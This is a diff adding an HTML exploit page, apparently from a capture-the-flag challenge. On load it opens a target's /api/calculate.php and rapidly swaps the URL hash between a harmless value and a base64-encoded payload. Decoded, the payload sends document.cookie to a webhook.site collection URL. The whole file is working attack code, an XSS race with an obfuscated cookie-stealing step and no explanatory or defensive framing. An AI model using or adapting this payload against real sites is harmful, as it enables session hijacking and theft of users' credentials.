@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Modify Location Hash</title>
+    <script>
+
+        function sleep(ms) {
+            return new Promise((r) => setTimeout(r, ms));
+        }
+
+        host = "localhost:8000"
+        //host = "15.165.237.22"
+        //host = "pwn20"
+
+        async function benign(win) {
+            win.location = "http://" + host + "/api/calculate.php#mSsx";
+        }
+
+        async function evil(win) {
+            win.location = "http://" + host + "/api/calculate.php#ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd2ViaG9vay5zaXRlL2M3NGE5NGM5LTY1YzctNGU1Zi1hODNmLTg1YjU3MDM2YmY4OS8/cD0iK2RvY3VtZW50LmNvb2tpZQ==";
+        }
+
+        async function modifyLocationHash() {
+            // Open the website
+            var url = "http://" + host + "/api/calculate.php"
+            var win = window.open(url);
+            await sleep(1000);
+
+            // Modify the location.hash
+
+            for (let i = 0; i < 10000; i++) {
+                benign(win);
+                await sleep(2);
+                evil(win);
+                await sleep(2);
+            }
+        }
+
+    </script>
+</head>
+
+<body onload="modifyLocationHash()">
+    <h1>Modify Location Hash Example</h1>
+</body>
+
+</html>
